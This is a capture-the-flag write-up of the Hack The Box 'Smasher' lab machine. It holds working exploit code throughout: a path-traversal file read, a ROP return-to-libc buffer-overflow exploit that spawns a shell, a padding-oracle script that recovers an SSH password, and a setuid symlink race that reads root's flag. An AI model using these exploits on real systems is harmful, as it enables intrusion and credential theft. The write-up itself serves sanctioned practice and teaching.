
# Hack the Box, Smasher - 10.10.10.89

## Scan

When performing a quick port scan, we find ports 22 and 1111 are open.
```sh
$ nmap -T5 -p- 10.10.10.89
Nmap scan report for 10.10.10.89
Host is up.
Not shown: 63245 closed ports, 2288 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver
```

By banner grabbing port 1111 we find it's `shenfeng tiny-web-server`.
```sh
$ curl -I 10.10.10.89:1111
HTTP/1.1 200 OK
Server: shenfeng tiny-web-server
Content-Type: text/html
```

A quick web search gives us <https://github.com/shenfeng/tiny-web-server>. When inspecting the repository, we quickly find an issue that allows us to read outside of the `wwwroot`<sup>1</sup>.

So, apparently we can do this:
```sh
$ curl 10.10.10.89:1111//etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
www:x:1000:1000:www,,,:/home/www:/bin/bash
smasher:x:1001:1001:,,,:/home/smasher:/bin/bash
```

Besides that, we also find the following interesting lines of code:
```c
// tiny-web-server/tiny.c

// line 19
#define MAXLINE 1024   /* max length of a line */

// lines 32-36
typedef struct {
    char filename[512];
    off_t offset;              /* for support Range */
    size_t end;
} http_request;

// lines 250 - 299
void url_decode(char* src, char* dest, int max) {
    char *p = src;
    char code[3] = { 0 };
    while(*p && --max) {
        if(*p == '%') {
            memcpy(code, ++p, 2);
            *dest++ = (char)strtoul(code, NULL, 16);
            p += 2;
        } else {
            *dest++ = *p++;
        }
    }
    *dest = '\0';
}

void parse_request(int fd, http_request *req){
    rio_t rio;
    char buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
    req->offset = 0;
    req->end = 0;              /* default */

    rio_readinitb(&rio, fd);
    rio_readlineb(&rio, buf, MAXLINE);
    sscanf(buf, "%s %s", method, uri); /* version is not cared */
    /* read all */
    while(buf[0] != '\n' && buf[1] != '\n') { /* \n || \r\n */
        rio_readlineb(&rio, buf, MAXLINE);
        if(buf[0] == 'R' && buf[1] == 'a' && buf[2] == 'n'){
            sscanf(buf, "Range: bytes=%lu-%lu", &req->offset, &req->end);
            // Range: [start, end]
            if( req->end != 0) req->end ++;
        }
    }
    char* filename = uri;
    if(uri[0] == '/'){
        filename = uri + 1;
        int length = strlen(filename);
        if (length == 0){
            filename = ".";
        } else {
            for (int i = 0; i < length; ++ i) {
                if (filename[i] == '?') {
                    filename[i] = '\0';
                    break;
                }
            }
        }
    }
    url_decode(filename, req->filename, MAXLINE);
}
```
Here, we can see that `filename` (or `uri[MAXLINE]`) is URL-decoded and copied into `req->filename`. However, `MAXLINE` is defined as 1024 even though the size of `http_request->filename` is equal to 512. We'll use this buffer overflow to create an exploit.

Let's use the path traversal to download the binary.
```sh
$ wget http://10.10.10.89:1111//home/www/tiny-web-server/tiny -O tiny
$ ./tiny
listen on port 9999, fd is 3
^C
```

Check it's properties.
```sh
$ checksec tiny
[*] '/tmp/data/tiny'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    FORTIFY:  Enabled
```

Ok, so this is where we chose the hard way (there is an easier way, which I might work out some day). We will try to leak an address of a function that falls in LIBC. We do this by making a call to `write` with the address we want to leak. For this we need the address of `write` in PLT (which we will call) and GOT (which we will use to leak the LIBC address).
```
$ objdump -d tiny | grep write
0000000000400c50 <write@plt>:
  400c50:	ff 25 e2 23 20 00    	jmpq   *0x2023e2(%rip)        # 603038 <write@GLIBC_2.2.5>
$ objdump -R tiny | grep write
0000000000603038 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
```

Furthermore, we need to set `rdi`, `rsi` and `rdx`<sup>2</sup>, which will be the arguments for `write(fd, void *buf, count)` (in that respective order).

```sh
$ ropper -f tiny | grep rdi
[...]
0x00000000004011dd: pop rdi; ret;
[...]

$ ropper -f tiny | grep rsi
[...]
0x00000000004011db: pop rsi; pop r15; ret;
[...]
```

Unfortunately, there is no `pop rdx;` in the binary, which is the number of bytes we would like to write to our file descriptor.
```sh
$ ropper -f tiny | grep rdx
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x00000000004026b7: add byte ptr [rax + rax], dh; add byte ptr [rax], al; sub al, 2; add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004026b9: add byte ptr [rax], al; add byte ptr [rdx + rax], ch; add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004026be: add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004026ba: add byte ptr [rax], al; sub al, 2; add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004026bb: add byte ptr [rdx + rax], ch; add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004024db: call qword ptr [rdx];
0x00000000004026c3: jmp qword ptr [rdx];
0x0000000000402543: jmp rdx;
0x0000000000401780: mov byte ptr [rdx], 0; add rsp, 0x10; pop rbx; pop rbp; pop r12; ret;
0x0000000000401302: push rdx; mov word ptr [rdi + 4], ax; ret;
0x00000000004026c0: sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004026bc: sub al, 2; add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
0x00000000004026b8: xor al, 0; add byte ptr [rax], al; sub al, 2; add byte ptr [rax], al; sal dl, 0xff; jmp qword ptr [rdx];
```

But, fortunately, if we run the program in GDB with a breakpoint at the return of `url_decode` (0x0x40178b), we see that `rdx` is a non-zero value:
```
 RDX  0x7fffffffe5de ◂— 0x400fa02700
```

The box wasn't very responsive when building this exploit, therefore we keep retrying, with a short timeout set, until we receive a response. Some resources used are referenced below<sup>3, 4, 5</sup>.

```python
#!/bin/python

from pwn import connect, cyclic_find, p64, u64, urlencode
from pwn import context, log


class Exploit:
	def __init__(self, ip, port, timeout=0.5):
		self.ip = ip
		self.port = port
		self.timeout = timeout

		# hardcoded values
		self.file_not_found = 'File not found'
		self.command = 'GET'

		# PIE disabled
		# since PIE is disabled, we can use the exact addresses from ropper
		self.pop_rdi = 0x4011dd  # 0x4011dd: pop rdi; ret;
		self.pop_rsi_pop_r15 = 0x4011db  # 0x4011db: pop rsi; pop r15; ret;

		self.write_plt = 0x400c50
		self.write_got = 0x603038

		# manually found
		self.offset = cyclic_find('vaaaaaac', n=8)

	def __leak(self, fun_got):
		# only encode url-unsafe characters to make sure that we still overflow
		# the buffer. An encoded character takes 3 spaces in the url buffer, but
		# only 1 space in the filename buffer.
		nop_sled = b'\x90' * self.offset

		payload = ''
		payload += nop_sled

		# rop chain
		payload += urlencode(p64(self.pop_rsi_pop_r15))
		payload += urlencode(p64(fun_got))         # address of libc function we want to leak
		payload += urlencode(p64(0xb5))            # bs filler

		payload += urlencode(p64(self.pop_rdi))
		payload += urlencode(p64(self.fd))         # fd we want to write to
		payload += urlencode(p64(self.write_plt))	 # function we want to call

		context.log_level = 'warn'

		# keep trying until we receive a response.
		output = ''
		while output == '':
			p = connect(self.ip, self.port)
			p.sendline(self.command + ' ' + payload)
			p.sendline('')

			try:
				p.recvuntil(self.file_not_found, timeout=self.timeout)
				output = p.recv(timeout=self.timeout)
			except:
				log.warning('Leak not found, retrying.')

			p.close()

		context.log_level = 'info'
		return u64(output[:8])

	def run(self):
		log.info('Start leaking address.')
		write_libc = self.__leak(self.write_got)


Exploit('10.10.10.89', 1111).run()
```

Now, we want to use this address to create a return-to-libc attack. And since we have a path traversal on the machine, we use that to download the libc from the machine and extract the needed addresses from it.
```sh
$ wget 10.10.10.89:1111//lib/x86_64-linux-gnu/libc-2.23.so
$ readelf -s libc-2.23.so | grep write
[...]
   169: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 __write@@GLIBC_2.2.5
[...]
  2159: 00000000000f72b0    90 FUNC    WEAK   DEFAULT   13 write@@GLIBC_2.2.5
$ readelf -s libc-2.23.so | grep system
[...]
   584: 0000000000045390    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
$ readelf -s libc-2.23.so | grep dup2
   592: 00000000000f7970    33 FUNC    GLOBAL DEFAULT   13 __dup2@@GLIBC_2.2.5
   962: 00000000000f7970    33 FUNC    WEAK   DEFAULT   13 dup2@@GLIBC_2.2.5
$ strings -a -t x libc-2.23.so | grep /bin/sh
 18cd57 /bin/sh
```

We use these to create our final exploit:
```python
#!/bin/python

from pwn import connect, cyclic_find, p64, u64, urlencode
from pwn import context, log


class Exploit:
	def __init__(self, ip, port, timeout=0.5):
		self.ip = ip
		self.port = port
		self.timeout = timeout

		# hardcoded values
		self.file_not_found = 'File not found'
		self.command = 'GET'

		# PIE disabled
		# since PIE is disabled, we can use the exact addresses from ropper
		self.pop_rdi = 0x4011dd  # 0x4011dd: pop rdi; ret;
		self.pop_rsi_pop_r15 = 0x4011db  # 0x4011db: pop rsi; pop r15; ret;

		self.write_got = 0x603038

		# libc offsets
		self.write_offset = 0xf72b0
		self.system_offset = 0x45390
		self.dup2_offset = 0xf7970
		self.binsh_str_offset = 0x18cd57

		# file descriptors
		self.fd = 4      # file descriptor of our connection
		self.stdin = 0   #
		self.stdout = 1  #
		self.stderr = 3  #

		# manually found
		self.offset = cyclic_find('vaaaaaac', n=8)

	def __leak(self, fun_got):
		[...]

	def __exploit(self, libc_base):
		nop_sled = b'\x90' * self.offset

		payload = ''
		payload += nop_sled

		dup2_libc = self.dup2_offset + libc_base

		# dup stdin
		payload += urlencode(p64(self.pop_rsi_pop_r15))
		payload += urlencode(p64(self.stdin))      # fd we want to dup from
		payload += urlencode(p64(0xb5))            # bs filler

		payload += urlencode(p64(self.pop_rdi))
		payload += urlencode(p64(self.fd))         # fd we want to dup to
		payload += urlencode(p64(dup2_libc))       # function we want to call

		# dup stdout as well
		payload += urlencode(p64(self.pop_rsi_pop_r15))
		payload += urlencode(p64(self.stdout))     # fd we want to dup from
		payload += urlencode(p64(0xb5))            # bs filler

		payload += urlencode(p64(self.pop_rdi))
		payload += urlencode(p64(self.fd))         # fd we want to dup to
		payload += urlencode(p64(dup2_libc))       # function we want to call

		# we can not also dup the stderr to our fd, so we will have to de without

		binsh_str = self.binsh_str_offset + libc_base
		system_libc = self.system_offset + libc_base

		# call system with argument '/bin/sh'
		payload += urlencode(p64(self.pop_rdi))
		payload += urlencode(p64(binsh_str))       # fd we want to dup to
		payload += urlencode(p64(system_libc))     # function we want to call

		context.log_level = 'warn'

		retry = True
		while retry:
			p = connect(self.ip, self.port)
			p.sendline(self.command + ' ' + payload)
			p.sendline('')

			output = p.recvuntil(self.file_not_found, timeout=self.timeout)

			if self.file_not_found in output:
				context.log_level = 'info'
				log.success('Got shell!')
				context.log_level = 'warn'
				p.interactive()
				retry = False

			p.close()

	def run(self):
		log.info('Start leaking address.')
		write_libc = self.__leak(self.write_got)
		libc_base = write_libc - self.write_offset

		log.success('Found libc base: {0}'.format(hex(libc_base)))
		log.info('Starting exploit.')
		self.__exploit(libc_base)


Exploit('10.10.10.89', 1111).run()
```

## User
Now that we have shell on the machine, let's look at the processes that are running.

```sh
$ ps -aux
[...]
smasher    652  0.0  0.1  24364  1708 ?        S    13:37   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py
[...]
www       1227  0.0  0.0   4364   660 ?        S    14:09   0:00 ./tiny public_html/ 1111
[...]
```

To make things a little easier, we use socat to listen on an outside port.
```sh
$ socat TCP-LISTEN:9001,fork,reuseaddr TCP:127.0.0.1:1337
```

From our own machine:
```sh
$ nc 10.10.10.89 9001
[*] Welcome to AES Checker! (type 'exit' to quit)
[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Hash is OK!
Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdw==
Invalid Padding!
```

This looks like a good moment to implement a padding oracle attack. We used the following resource and implement a quick tailor made attack<sup>6</sup>.

```python
#!/usr/bin/python

import base64
from pwn import connect, log


# utils
def bytes2hexstring(bts):
	return ":".join("{:02x}".format(ord(c)) for c in bts)


def bytesjoin(bts):
	return ''.join([chr(x) for x in bts])


def bytexor(lhs, rhs):
	return bytesjoin([ord(a) ^ ord(b) for a, b in zip(lhs, rhs)])


def padding(idx):
	return [0] * (16 - idx + 1) + [idx] * (idx - 1)


def remove_padding(bts):
	padding = ord(bts[-1])
	if bts[-padding:] == bts[-1] * padding:
		return bts[:-padding]

	return bts


def intxor(lhs, rhs):
	return [a ^ b for a, b in zip(lhs, rhs)]


class SmashingOracle:
	def __init__(self, ip, port):
		self.invalid_output = "Invalid Padding!"
		self.valid_output = "Hash is OK!"

		self.text = 'Insert ciphertext: '

		self.block_size = 16  # AES128
		self.first_block = '\x00' * self.block_size

		# init
		self.proc = connect(ip, port)
		self.proc.recvuntil(self.text)

	def __is_valid(self, block):
		block = base64.b64encode(block)
		self.proc.sendline(block)
		output = self.proc.recvuntil(self.text)
		return self.valid_output in output and self.invalid_output not in output

	def __smash_oracle(self, C1, C2):
		I2 = [0] * self.block_size
		for idx in range(1, 17):
			junk = intxor(I2, padding(idx))

			for itr in range(256):
				junk[self.block_size - idx] = itr

				if self.__is_valid(bytesjoin(junk) + C2):
					I2[self.block_size - idx] = itr ^ idx

					log.info('Found: %3d - %s', itr, bytes2hexstring(bytesjoin(I2)))
					break

		return bytexor(C1, bytesjoin(I2))

	def run(self, secret):
		C = base64.b64decode(secret)
		n_blocks = len(C)
		C = self.first_block + C

		result = ''
		for block in range(0, n_blocks, self.block_size):
			result += self.__smash_oracle(
				C[block:block + self.block_size],
				C[block + self.block_size:block + 2 * self.block_size]
			)

		result = remove_padding(result)
		log.success('Result: %s', result)
		return result


secret = 'irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg=='
SmashingOracle('10.10.10.89', 9001).run(secret)
```

This way, we obtain the plaintext pretty fast:
```
SSH password for user 'smasher' is: xxxxxxxxxxxxxxxxxxxxxx
```

Now that we have the SSH password, let's grab user.
```sh
$ sshpass -p xxxxxxxxxxxxxxxxxxxxxx ssh smasher@10.10.10.89
smasher@smasher:~$ cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

## Root

From here, things get boring. After looking around for a very long time, we find the following binary:
```sh
smasher@smasher:~$ ls -lah /usr/bin/checker
-rwsr-xr-x 1 root root 14K Apr  4  2018 /usr/bin/checker
smasher@smasher:~$ checker
[+] Welcome to file UID checker 0.1 by dzonerzy

Missing arguments
smasher@smasher:~$ checker user.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 0

Data:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
smasher@smasher:~$ checker /root/root.txt
[+] Welcome to file UID checker 0.1 by dzonerzy

Acess failed , you don't have permission!
smasher@smasher:~$ checker /etc/passwd
[+] Welcome to file UID checker 0.1 by dzonerzy

Segmentation fault
```

This looks interesting. We download the binary and disassemble main.
```sh
$ strings -n 20 checker
/lib64/ld-linux-x86-64.so.2
You're not 'smasher' user please level up bro!
[+] Welcome to file UID checker 0.1 by dzonerzy
Acess failed , you don't have permission!
File does not exist!
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609
[...]
gdb> disassemble main
Dump of assembler code for function main:
   0x0000000000400a7b <+0>:	push   rbp
   0x0000000000400a7c <+1>:	mov    rbp,rsp
   0x0000000000400a7f <+4>:	sub    rsp,0x230
   0x0000000000400a86 <+11>:	mov    DWORD PTR [rbp-0x224],edi
   0x0000000000400a8c <+17>:	mov    QWORD PTR [rbp-0x230],rsi
   0x0000000000400a93 <+24>:	call   0x4007d0 <getuid@plt>
   0x0000000000400a98 <+29>:	cmp    eax,0x0
   0x0000000000400a9d <+34>:	je     0x400ab3 <main+56>
   0x0000000000400a9f <+36>:	mov    edi,0x400c70
   0x0000000000400aa4 <+41>:	call   0x4007a0 <puts@plt>
   0x0000000000400aa9 <+46>:	mov    eax,0xffffffff
   0x0000000000400aae <+51>:	jmp    0x400bb5 <main+314>
   0x0000000000400ab3 <+56>:	mov    edi,0x400ca0
   0x0000000000400ab8 <+61>:	call   0x4007a0 <puts@plt>
   0x0000000000400abd <+66>:	cmp    DWORD PTR [rbp-0x224],0x1
   0x0000000000400ac4 <+73>:	jle    0x400ba6 <main+299>
   0x0000000000400aca <+79>:	mov    rax,QWORD PTR [rbp-0x230]
   0x0000000000400ad1 <+86>:	mov    rax,QWORD PTR [rax+0x8]
   0x0000000000400ad5 <+90>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400ad9 <+94>:	mov    edi,0x90
   0x0000000000400ade <+99>:	call   0x400830 <malloc@plt>
   0x0000000000400ae3 <+104>:	mov    QWORD PTR [rbp-0x10],rax
   0x0000000000400ae7 <+108>:	mov    rdx,QWORD PTR [rbp-0x10]
   0x0000000000400aeb <+112>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400aef <+116>:	mov    rsi,rdx
   0x0000000000400af2 <+119>:	mov    rdi,rax
   0x0000000000400af5 <+122>:	call   0x400c40 <stat>
   0x0000000000400afa <+127>:	test   eax,eax
   0x0000000000400afc <+129>:	jne    0x400b9a <main+287>
   0x0000000000400b02 <+135>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400b06 <+139>:	mov    esi,0x4
   0x0000000000400b0b <+144>:	mov    rdi,rax
   0x0000000000400b0e <+147>:	call   0x400860 <access@plt>
   0x0000000000400b13 <+152>:	test   eax,eax
   0x0000000000400b15 <+154>:	jne    0x400b8e <main+275>
   0x0000000000400b17 <+156>:	mov    edi,0x0
   0x0000000000400b1c <+161>:	call   0x400880 <setuid@plt>
   0x0000000000400b21 <+166>:	mov    edi,0x0
   0x0000000000400b26 <+171>:	call   0x400850 <setgid@plt>
   0x0000000000400b2b <+176>:	mov    edi,0x1
   0x0000000000400b30 <+181>:	call   0x400890 <sleep@plt>
   0x0000000000400b35 <+186>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400b39 <+190>:	mov    rdi,rax
   0x0000000000400b3c <+193>:	call   0x4009a6 <ReadFile>
   0x0000000000400b41 <+198>:	mov    QWORD PTR [rbp-0x18],rax
   0x0000000000400b45 <+202>:	mov    rdx,QWORD PTR [rbp-0x18]
   0x0000000000400b49 <+206>:	lea    rax,[rbp-0x220]
   0x0000000000400b50 <+213>:	mov    rsi,rdx
   0x0000000000400b53 <+216>:	mov    rdi,rax
   0x0000000000400b56 <+219>:	call   0x400790 <strcpy@plt>
   0x0000000000400b5b <+224>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400b5f <+228>:	mov    eax,DWORD PTR [rax+0x1c]
   0x0000000000400b62 <+231>:	mov    esi,eax
   0x0000000000400b64 <+233>:	mov    edi,0x400cd1
   0x0000000000400b69 <+238>:	mov    eax,0x0
   0x0000000000400b6e <+243>:	call   0x4007e0 <printf@plt>
   0x0000000000400b73 <+248>:	lea    rax,[rbp-0x220]
   0x0000000000400b7a <+255>:	mov    rsi,rax
   0x0000000000400b7d <+258>:	mov    edi,0x400cdf
   0x0000000000400b82 <+263>:	mov    eax,0x0
   0x0000000000400b87 <+268>:	call   0x4007e0 <printf@plt>
   0x0000000000400b8c <+273>:	jmp    0x400bb0 <main+309>
   0x0000000000400b8e <+275>:	mov    edi,0x400cf0
   0x0000000000400b93 <+280>:	call   0x4007a0 <puts@plt>
   0x0000000000400b98 <+285>:	jmp    0x400bb0 <main+309>
   0x0000000000400b9a <+287>:	mov    edi,0x400d1a
   0x0000000000400b9f <+292>:	call   0x4007a0 <puts@plt>
   0x0000000000400ba4 <+297>:	jmp    0x400bb0 <main+309>
   0x0000000000400ba6 <+299>:	mov    edi,0x400d2f
   0x0000000000400bab <+304>:	call   0x4007a0 <puts@plt>
   0x0000000000400bb0 <+309>:	mov    eax,0x0
   0x0000000000400bb5 <+314>:	leave
   0x0000000000400bb6 <+315>:	ret
End of assembler dump.
```

Besides the fact that we get a segmentation fault if we feed it a big enough file, what is also interesting here is that we see that `setuid` is called with 0 (i.e. root) as an argument. Also, we can see that there is a call to `sleep` for 1 second, which looks almost to good to be true. Apparently, what is going on is that the binary first checks whether we are user 'smasher', before calling setuid with 0, taking a nap for 1 second and finally read the file that we passed.

This sounds like a little symlink race. We end up with the following:

```sh
smasher@smasher:~$ echo "Too late" > shell.php
smasher@smasher:~$ checker shell.php & (sleep 0.1 && ln -sf /root/root.txt shell.php)
[+] Welcome to file UID checker 0.1 by dzonerzy

File UID: 1001

Data:
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

___

1. https://github.com/shenfeng/tiny-web-server/issues/2
2. https://stackoverflow.com/a/28354265/2961949
3. https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/
4. https://www.youtube.com/watch?v=6S4A2nhHdWg
5. http://www.pwntester.com/tag/pwnable/
6. https://robertheaton.com/2013/07/29/padding-oracle-attack/
